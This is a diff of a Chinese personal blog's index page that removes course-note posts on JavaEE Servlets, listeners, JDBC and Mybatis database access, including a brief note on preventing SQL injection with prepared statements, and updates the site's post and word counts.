-<h2 id="JavaEE-监听器-Listen"><a href="#JavaEE-监听器-Listen" class="headerlink" title="JavaEE-监听器-Listen"></a>JavaEE-监听器-Listen</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52797170/article/details/124023760">https://blog.csdn.net/qq_52797170/article/details/124023760</a>  </p>
-<ul>
-<li>监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件</li>
-<li>监听域对象的属性发生修改的事件</li>
-<li>监听在事件发生前、发生后做一些必要的处理<br>1、创建监听器<br>2、监听器内置方法<br>3、监听器触发流程  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    .......</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
-4、监听器安全场景<br>代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">32安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:36:49" itemprop="dateCreated datePublished" datetime="2023-10-18T10:36:49+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:10:32" itemprop="dateModified" datetime="2023-11-06T21:10:32+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>27、JavaEE-HTTP-Servlet技术  </li>
-<li>28、JavaEE-数据库-JDBC&amp;Mybatis</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/32%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/servlet.png"></p>
-<h2 id="JavaEE-HTTP-Servlet-路由-周期"><a href="#JavaEE-HTTP-Servlet-路由-周期" class="headerlink" title="JavaEE-HTTP-Servlet&amp;路由&amp;周期"></a>JavaEE-HTTP-Servlet&amp;路由&amp;周期</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52173163/article/details/121110753">https://blog.csdn.net/qq_52173163/article/details/121110753</a>  </p>
-<ul>
-<li><p>1、解释<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。  </p>
-</li>
-<li><p>2、创建和使用Servlet<br>-创建一个类继承HttpServlet<br>-web.xml配置Servlet路由<br>-WebServlet配置Servlet路由<br>-写入内置方法(init service destroy doget dopost)  </p>
-</li>
-<li><p>3、Servlet生命周期<br>见图  </p>
-</li>
-<li><p>4、处理接受和回显  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest       — ServletRequest的子接口  </span><br><span class="line">getParameter(name)       — String 通过name获得值  </span><br><span class="line">getParameterValues       — String[ ] 通过name获得多值  </span><br><span class="line">  </span><br><span class="line">HttpServletResponse      — ServletResponse的子接口   </span><br><span class="line">setCharacterEncoding()   — 设置编码格式  </span><br><span class="line">setContentType()         — 设置解析语言  </span><br><span class="line">getWriter()              — 获得一个PrintWriter字符输出流输出数据  </span><br><span class="line">PrintWriter              — 接受符合类型数据  </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="JavaEE-数据库-JDBC-Mybatis-库"><a href="#JavaEE-数据库-JDBC-Mybatis-库" class="headerlink" title="JavaEE-数据库-JDBC&amp;Mybatis&amp;库"></a>JavaEE-数据库-JDBC&amp;Mybatis&amp;库</h2><p>(java和数据库连接，三种方式，自带官方库jdbc、第三方 hibernate和mybatis)  </p>
-<ul>
-<li><p>原生态数据库开发：JDBC<br>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！  </p>
-</li>
-<li><p>1、下载jar<br><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a>  </p>
-</li>
-<li><p>2、引用封装jar<br>创建lib目录，复制导入后，添加为库  </p>
-</li>
-<li><p>3、注册数据库驱动  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  </span><br></pre></td></tr></table></figure></li>
-<li><p>4、建立数据库连接  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;jdbc:mysql://localhost:3306/demo01&quot;</span>;</span><br><span class="line">Connection connection=DriverManager.getConnection(url,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br></pre></td></tr></table></figure></li>
-<li><p>5、创建Statement执行SQL  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Statement statement= connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br></pre></td></tr></table></figure></li>
-<li><p>6、结果ResultSet进行提取  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">page_title</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;page_title&quot;</span>);</span><br><span class="line">    .......</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>7、安全修复SQL注入：预编译<br>原理：提前编译好执行逻辑，你注入的语句不会改变原有逻辑！  </p>
-</li>
-<li><p>8、框架数据库开发：Mybatis<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mybatis是一款优秀的持久层框架,避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集的过程，减少了代码的冗余，减少程序员的操作。</p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
 
   
   <nav class="pagination">
@@ -1517,7 +1524,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-count">74</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1593,19 +1600,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">181k</span>
+    <span title="站点总字数">185k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:45</span>
+    <span title="站点阅读时长">2:48</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共67.9k字</span>
+  <span class="post-count">博客全站共69.7k字</span>
 </div>
 
 
